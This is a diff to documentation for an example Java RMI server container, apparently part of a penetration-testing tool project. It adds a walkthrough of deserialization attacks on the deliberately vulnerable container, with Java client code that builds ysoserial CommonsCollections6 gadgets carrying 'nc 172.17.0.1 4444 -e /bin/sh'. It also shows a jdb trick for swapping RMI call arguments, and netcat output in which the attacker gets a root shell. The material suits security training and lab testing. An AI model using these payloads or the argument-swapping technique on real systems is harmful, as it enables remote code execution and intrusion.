@@ -13,11 +13,11 @@ You can either build the container from source or load it from *GitHub Packages*
 * To load the container from *GitHub Packages*, just authenticate using your personal access token and
   run the corresponding pull command:
   ```console
-  $ sudo docker login https://docker.pkg.github.com -u <USERNAME>
+  $ docker login https://docker.pkg.github.com -u <USERNAME>
   Password:
 
   Login Succeeded
-  $ sudo docker pull docker.pkg.github.com/qtc-de/remote-method-guesser/rmg-example-server:1.0
+  $ docker pull docker.pkg.github.com/qtc-de/remote-method-guesser/rmg-example-server:1.0
   ```
 
 To change the default configuration of the container (like e.g. the *SSL* certificate), you can modify the [docker-compose.yml](/.docker/docker-compose.yml)
@@ -387,3 +387,280 @@ For the current case, where the method most likely just executes an operating sy
 ```
 
 As expected, we get code execution on the *Java RMI* server.
+
+
+#### ISecureServerLogMessageSample
+
+The ``ISecureServerLogMessageSample`` is different from the previous one, as it does not use a method
+that exposes dangerous functionality directly. However, as it accepts an arbitrary object as input parameter, it
+is vulnerable to *deserialization attacks* (actually, the method itself is not vulnerable, but the server is, as it
+does not implement a proper *deserialization whitelist*). For an successful attack, a suitable *gadget chain* needs
+to be available on the application servers classpath. In case of the container provided within this repository,
+``commons-collections-3.1`` was manually added to create a vulnerable instance.
+
+To test the *insecure deserialization*, we can use *ysoserial* as a library and modify the sample *Java* code from
+the previous example like this:
+
+```java
+[...]
+import javax.net.ssl.TrustManager;
+import javax.rmi.ssl.SslRMIClientSocketFactory;
+
+import de.qtc.rmg.ISecureServer;
+
+import ysoserial.payloads.ObjectPayload.Utils;
+
+/*
+ * Compile this sample class with the following command:
+ *      javac ISecureServerLogMessageSample.java
+ */
+public class ISecureServerLogMessageSample extends SSLSocketFactory {
+[...]
+
+try {
+
+    System.out.print("[+] Connecting to registry on " + remoteHost + ":" + remotePort + "... ");
+    Registry registry = null;
+
+    if( true ) {
+        RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
+        registry = LocateRegistry.getRegistry(remoteHost, remotePort, csf);
+    } else {
+        registry = LocateRegistry.getRegistry(remoteHost, remotePort);
+    }
+
+    System.out.println("done!");
+
+    System.out.println("[+] Starting lookup on secure-server... ");
+    ISecureServer stub = (ISecureServer) registry.lookup("secure-server");
+
+    int argument0 = 1;
+    java.lang.Object argument1 = Utils.makePayloadObject("CommonsCollections6", "nc 172.17.0.1 4444 -e /bin/sh");
+
+    System.out.print("[+] Invoking method logMessage... ");
+    stub.logMessage(argument0, argument1);
+    System.out.println("done!");
+
+[...]
+```
+
+During the compilation, we need the ``ysoserial.jar`` file in our classpath:
+
+```console
+[qtc@kali ISecureServerLogMessageSample]$ javac -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT.jar:. ISecureServerLogMessageSample.java
+```
+
+After executing the sample, our custom client will connect to the *RMI server* and send
+the malicious *ysoserial* gadget as argument to the ``logMessage`` method. As no deserialization filter
+is applied, the server will *deserialize* the *gadget*. This causes an exception on the server side,
+as the *deserialized* class does not match the servers expectations. However, the attack is already
+finished at this point and we obtained a shell:
+
+```console
+[qtc@kali ISecureServerLogMessageSample]$ java -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar:. ISecureServerLogMessageSample
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[+] Connecting to registry on 172.17.0.2:1090... done!
+[+] Starting lookup on secure-server...
+[+] RMI object tries to connect to different remote host: iinsecure.dev
+[+]	Redirecting the connection back to 172.17.0.2...
+[+]	This is done for all further requests. This message is not shown again.
+[+] Invoking method logMessage... failed!
+[-] The following exception was thrown:java.util.HashSet cannot be cast to java.lang.String
+[-] Full stacktrace:
+java.lang.ClassCastException: java.util.HashSet cannot be cast to java.lang.String
+	at de.qtc.rmg.SecureServer.logMessage(SecureServer.java:29)
+	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.lang.reflect.Method.invoke(Method.java:498)
+	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)
+	at sun.rmi.transport.Transport$1.run(Transport.java:200)
+	at sun.rmi.transport.Transport$1.run(Transport.java:197)
+	at java.security.AccessController.doPrivileged(Native Method)
+	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
+	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
+	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
+	at java.security.AccessController.doPrivileged(Native Method)
+	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at java.lang.Thread.run(Thread.java:748)
+	at java.rmi/sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:283)
+	at java.rmi/sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:260)
+	at java.rmi/sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)
+	at java.rmi/java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:209)
+	at java.rmi/java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:161)
+	at com.sun.proxy.$Proxy0.logMessage(Unknown Source)
+	at ISecureServerLogMessageSample.main(ISecureServerLogMessageSample.java:105)
+
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:38597.
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+
+#### ISecureServerLoginSample
+
+The ``ISecureServerLoginSample`` can also be used for *deserialization attacks*. However, in contrast
+to the ``logMessage`` method, the ``login`` method expects a ``HashMap`` as argument. On the server side,
+this doesn't really matter, as the server tries to *deserialize* our input object anyway (this is true for
+all non primitive types except the ``String`` type. Again, read the [blog post](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
+from *Hans-Martin* if you want to know more about this). On the client side, however, the attack becomes more
+difficult as we can not simply invoke the ``login`` method with an arbitrary ``ysoseial`` gadget, as this causes
+a type mismatch.
+
+When invoking a *RMI* method, the client computes a hash over the methods signature and sends it to the server.
+If the corresponding method signature exists on the server side, the server gives its okay for the call. Simply
+redefining the *remote objects* interface on the client side to accept arbitrary objects is therefore not an option.
+
+In the previously mentioned blog post of *Hans-Martin*, he solves this problem by attaching a debugger and replacing
+the method arguments at runtime. As pointed out by him, the ``invokeRemoteMethod`` call from the ``java.rmi.server.RemoteObjectInvocationHandler`` class
+(which is responsible for all *RMI* calls) treats all method arguments as an array of type ``Object`` anyway.
+Hooking this function and replacing the input arguments is therefore quite easy.
+
+```java
+private Object invokeRemoteMethod(Object proxy, Method method, Object[] args) throws Exception
+{
+    try {
+        if (!(proxy instanceof Remote)) {
+            throw new IllegalArgumentException(
+                "proxy not Remote instance");
+        }
+        return ref.invoke((Remote) proxy, method, args,
+                          getMethodHash(method));
+    } catch (Exception e) {
+        if (!(e instanceof RuntimeException)) {
+            Class<?> cl = proxy.getClass();
+            try {
+                method = cl.getMethod(method.getName(),
+                                      method.getParameterTypes());
+            } catch (NoSuchMethodException nsme) {
+                throw (IllegalArgumentException)
+                    new IllegalArgumentException().initCause(nsme);
+            }
+            Class<?> thrownType = e.getClass();
+            for (Class<?> declaredType : method.getExceptionTypes()) {
+                if (declaredType.isAssignableFrom(thrownType)) {
+                    throw e;
+                }
+            }
+            e = new UnexpectedException("unexpected exception", e);
+        }
+        throw e;
+    }
+}
+```
+
+In the general case, [YouDebug](http://youdebug.kohsuke.org/) is probably the better choice for tampering with the
+arguments, but in our case *jdb* is sufficient. First, we prepare ``ISecureServerLoginSample.java`` to include out
+``ysoserial`` payload:
+
+```java
+[...]
+import ysoserial.payloads.ObjectPayload.Utils;
+
+/*
+ * Compile this sample class with the following command:
+ *      javac -d . ISecureServerLoginSample.java
+ */
+public class ISecureServerLoginSample extends SSLSocketFactory {
+
+    private static int remotePort = 1090;
+    private static String remoteHost = "172.17.0.2";
+
+    public static Object[] payload = new Object[]{Utils.makePayloadObject("CommonsCollections6", "nc 172.17.0.1 4444 -e /bin/sh")};
+
+    public static void main(String[] argv) {
+[...]
+
+      try {
+
+          System.out.print("[+] Connecting to registry on " + remoteHost + ":" + remotePort + "... ");
+          Registry registry = null;
+
+          if( true ) {
+              RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
+              registry = LocateRegistry.getRegistry(remoteHost, remotePort, csf);
+          } else {
+              registry = LocateRegistry.getRegistry(remoteHost, remotePort);
+          }
+
+          System.out.println("done!");
+
+          System.out.println("[+] Starting lookup on secure-server... ");
+          ISecureServer stub = (ISecureServer) registry.lookup("secure-server");
+
+          java.util.HashMap argument0 = new HashMap();;
+
+          System.out.print("[+] Invoking method login... ");
+          java.lang.String response = stub.login(argument0);
+          System.out.println("done!");
+
+          System.out.println("[+] The servers response is: " + response);
+```
+
+Now we need to compile ``ISecureServerLoginSample.java`` with ``ysoserial`` within our classpath. Afterwards,
+we can run the sample within *jdb*.
+
+```console
+[pentester@kali ISecureServerLoginSample]$ javac -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT.jar:. ISecureServerLoginSample.java 
+[pentester@kali ISecureServerLoginSample]$ jdb -classpath /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar:. ISecureServerLoginSample
+Initializing jdb ...
+
+> stop in java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod
+Deferring breakpoint java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod.
+It will be set after the class is loaded.
+
+> run
+run ISecureServerLoginSample
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+
+> 
+VM Started: [+] Connecting to registry on 172.17.0.2:1090... done!
+[+] Starting lookup on secure-server... 
+Set deferred breakpoint java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod
+[+] RMI object tries to connect to different remote host: iinsecure.dev
+[+]	Redirecting the connection back to 172.17.0.2... 
+[+]	This is done for all further requests. This message is not shown again. 
+[+] Invoking 
+Breakpoint hit: method login... "thread=main", java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(), line=206 bci=0
+
+main[1] eval args
+ args = instance of java.lang.Object[1] (id=2257)
+
+main[1] eval args=ISecureServerLoginSample.payload
+ args=ISecureServerLoginSample.payload = instance of java.lang.Object[1] (id=2259)
+
+main[1] cont
+> failed!
+
+[-] The following exception was thrown:argument type mismatch
+[-] Full stacktrace:
+java.lang.IllegalArgumentException: argument type mismatch
+	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+[...]
+```
+
+As expected, we get an ``IllegalArgumentException``. However, at this point the attack is already done
+and we obtained a shell on our *nc* listener:
+
+```console
+[pentester@kali ~]$ nc -vlp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:41821.
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
